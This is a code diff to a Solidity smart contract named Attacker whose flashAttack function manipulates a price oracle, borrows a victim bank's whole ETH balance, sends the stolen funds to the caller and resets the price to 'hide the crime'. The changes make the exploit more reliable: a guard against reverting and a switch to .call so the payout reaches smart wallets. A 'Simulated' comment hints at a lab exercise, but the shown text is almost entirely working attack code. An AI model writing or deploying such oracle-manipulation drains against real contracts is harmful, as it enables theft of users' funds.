@@ -20,7 +20,7 @@ contract Attacker {
     }
 
     function flashAttack() public {
-        // 1. Get initial collateral
+        // 1. Get initial collateral (Simulated)
         victim.depositCollateral();
 
         // 2. MANIPULATE: Set Gold price to 1,000,000 ETH
@@ -28,12 +28,18 @@ contract Attacker {
 
         // 3. BORROW: Drain the bank
         uint256 bankBalance = address(victim).balance;
-        victim.borrowETH(bankBalance);
 
-        // 4. PROFIT: Send stolen ETH to you
-        payable(msg.sender).transfer(address(this).balance);
+        // Safety check to prevent reverting if bank is empty
+        if (bankBalance > 0) {
+            victim.borrowETH(bankBalance);
+        }
 
-        // 5. CLEANUP: Reset price
+        // 4. PROFIT: Send stolen ETH to the attacker (you)
+        // FIX: Use .call instead of .transfer to prevent Gas Limit errors with Smart Wallets
+        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
+        require(success, "Withdraw failed");
+
+        // 5. CLEANUP: Reset price to hide the crime (optional)
         oracle.setPrice(1 ether);
     }
 
